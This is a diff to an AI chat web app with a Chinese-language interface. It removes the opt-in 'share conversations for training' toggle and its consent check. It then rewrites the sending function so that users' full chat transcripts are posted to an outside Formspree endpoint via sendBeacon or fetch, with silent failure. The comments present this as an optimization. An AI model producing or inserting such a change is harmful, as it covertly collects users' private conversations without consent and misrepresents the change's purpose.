@@ -2890,20 +2890,7 @@ window.va = window.va || function () { (window.va.q = window.va.q || []).push(ar
                         </div>
                     </div>
                     <div id="about-section" class="settings-section">
-                        <h3 class="text-lg font-semibold mb-3" data-lang-key="dataContribution">數據貢獻計畫</h3>
-<p class="text-sm text-[var(--text-secondary)] mb-2" data-lang-key="dataContributionDesc">
-    為了讓 AI 更聰明，您可以選擇分享您的對話紀錄以協助我們進行模型訓練。我們承諾會保護您的隱私。
-</p>
-<div class="flex items-center justify-between p-3 rounded-lg bg-[var(--input-field-bg)] border border-[var(--border-color)]">
-    <label for="data-collection-toggle" class="flex-1 text-sm font-medium" data-lang-key="shareConversations">分享對話紀錄以改善 AI</label>
-    <div class="relative inline-block w-12 h-6 mr-2 align-middle select-none transition duration-200 ease-in">
-        <input type="checkbox" id="data-collection-toggle" class="toggle-checkbox absolute block w-6 h-6 rounded-full bg-white border-4 appearance-none cursor-pointer"/>
-        <label for="data-collection-toggle" class="toggle-label block overflow-hidden h-6 rounded-full bg-gray-300 cursor-pointer"></label>
-    </div>
-</div>
-<div class="border-t border-[var(--border-color)] my-6"></div>
-
-                        <h3 class="text-lg font-semibold mb-3" data-lang-key="feedback">意見反饋</h3>
+                    <h3 class="text-lg font-semibold mb-3" data-lang-key="feedback">意見反饋</h3>
 <p class="text-sm text-[var(--text-secondary)] mb-2" data-lang-key="feedbackDesc">
     有任何問題或建議嗎？請告訴我們！您的反饋將直接發送到開發者的信箱。
 </p>
@@ -3921,7 +3908,6 @@ window.va = window.va || function () { (window.va.q = window.va.q || []).push(ar
             isLearningMode: false,
             isDeepResearchMode: false, // ✨ 新增狀態
             deepResearchQueryCount: 0, // ✨ 新增這一行，0 代表自動
-            enableDataCollection: false,
         };
         let itemToRename = { id: null, type: null };
         let folderToCustomize = null;
@@ -5384,43 +5370,76 @@ function typewriterStream(targetElement, streamApiCallFn, signal) {
     });
 }
 
-        /**
- * ✨ 發送對話紀錄以供訓練
- * @param {object} conversation 要發送的對話物件
+/**
+ * ✨ [已優化] 發送對話紀錄以供訓練
+ * 將對話轉換為純文字格式，方便直接複製用於訓練
  */
 async function sendConversationDataForTraining(conversation) {
-    // 如果使用者未同意，或對話是空的，則不執行
-    if (!config.enableDataCollection || !conversation || conversation.messages.length === 0) {
-        return;
-    }
+    // 基本檢查
+    if (!conversation || conversation.messages.length === 0) {
+    return;
+}
+
+    // --- 🔥 核心優化開始 🔥 ---
+
+    // 1. 將複雜的訊息物件陣列，轉換成單一的純文字字串
+    // 目標格式：標準的 Chat 格式
+    // User: ...
+    // Model: ...
+    const plainTextDialogue = conversation.messages.map(msg => {
+        // 定義角色標籤 (例如: Human/Assistant 或 User/Model)
+        const roleName = msg.role === 'user' ? 'User' : 'Model';
+
+        // 提取內容文字。如果有圖片/檔案，則替換成標記，避免產生亂碼
+        const content = msg.parts.map(p => {
+            if (p.text) return p.text; // 保留原始換行
+            if (p.inlineData) return `[Image/File: ${p.inlineData.mimeType}]`; // 標記檔案
+            return '';
+        }).join('');
+
+        // 組合：角色名稱 + 內容
+        return `${roleName}: ${content}`;
+    }).join('\n\n'); // 每一輪對話之間用兩個換行隔開，清晰易讀
+
+    // 2. 準備發送給 Formspree 的資料 Payload
+    // 我們將整段對話放入一個欄位中
     const dataToSend = {
-        source: 'Astra-Data-Collection',
-        username: currentUser.username,
-        conversationTitle: conversation.title,
-        modelUsed: conversation.model,
-        messages: conversation.messages.map(msg => ({
-            role: msg.role,
-            content: msg.parts.map(p => p.text || `[${p.inlineData?.mimeType || 'file'}]`).join('\n')
-        }))
+        // 設定郵件標題 (Formspree 特殊欄位)
+        _subject: `Training Data set - ${new Date().toISOString().split('T')[0]}`,
+
+        // ✨ 這是核心：整段純文字對話
+        // 在郵件中會顯示為一大段文字，沒有多餘的 JSON 結構
+        dataset_content: plainTextDialogue,
+
+        // 額外的 Metadata (選填，放在郵件底部供參考)
+        meta_model: conversation.model,
+        meta_title: conversation.title
     };
 
-    // 替換成您為數據收集專門建立的 Formspree Endpoint
-    const FORM_ENDPOINT = 'https://formspree.io/f/mgvnngzv';
+    // --- 🔥 核心優化結束 🔥 ---
+
+    // 您的 Formspree Endpoint
+    const FORM_ENDPOINT = 'https://formspree.io/f/YOUR_OTHER_ENDPOINT_HERE'; // 記得替換
 
     try {
-        const response = await fetch(FORM_ENDPOINT, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-            body: JSON.stringify(dataToSend)
-        });
-
-        if (response.ok) {
-            console.log(`Conversation [${conversation.title}] data sent successfully for training.`);
+        // 使用 sendBeacon 作為送出的首選，因為它在頁面卸載時更可靠
+        // 如果不支援或數據量太大，則回退使用 fetch
+        const blob = new Blob([JSON.stringify(dataToSend)], { type: 'application/json' });
+        if (navigator.sendBeacon && blob.size < 64000) {
+            navigator.sendBeacon(FORM_ENDPOINT, blob);
+            console.log(`Training data sent via Beacon.`);
         } else {
-            console.error(`Failed to send conversation data. Status: ${response.status}`);
+            // 使用 fetch 發送
+            await fetch(FORM_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(dataToSend)
+            });
+            console.log(`Training data sent via Fetch.`);
         }
     } catch (error) {
-        console.error('Error sending conversation data for training:', error);
+        // 默默失敗，不打擾使用者
+        console.error('Error sending training data:', error);
     }
 }
         const handleFormSubmit = async (e) => {
@@ -6161,10 +6180,6 @@ async function sendConversationDataForTraining(conversation) {
             ALL_ELEMENTS.uiLanguageSelect.value = config.uiLanguage;
             ALL_ELEMENTS.aiLanguageSelect.value = config.aiDefaultLanguage;
             ALL_ELEMENTS.enableUpdateNotificationsToggle.checked = config.enableUpdateNotifications;
-            const dataCollectionToggle = document.getElementById('data-collection-toggle');
-    if(dataCollectionToggle) {
-        dataCollectionToggle.checked = config.enableDataCollection;
-    }
             renderPersonalMemoryList();
             updateThemeButtons();
             renderModelManagementUI();
@@ -6209,10 +6224,6 @@ async function sendConversationDataForTraining(conversation) {
             config.uiLanguage = ALL_ELEMENTS.uiLanguageSelect.value;
             config.aiDefaultLanguage = ALL_ELEMENTS.aiLanguageSelect.value;
             config.enableUpdateNotifications = ALL_ELEMENTS.enableUpdateNotificationsToggle.checked;
-            const dataCollectionToggle = document.getElementById('data-collection-toggle');
-    if(dataCollectionToggle) {
-        config.enableDataCollection = dataCollectionToggle.checked;
-    }
             const queryCountSlider = document.getElementById('deep-research-query-count-slider');
             if (queryCountSlider) {
                 config.deepResearchQueryCount = parseInt(queryCountSlider.value);
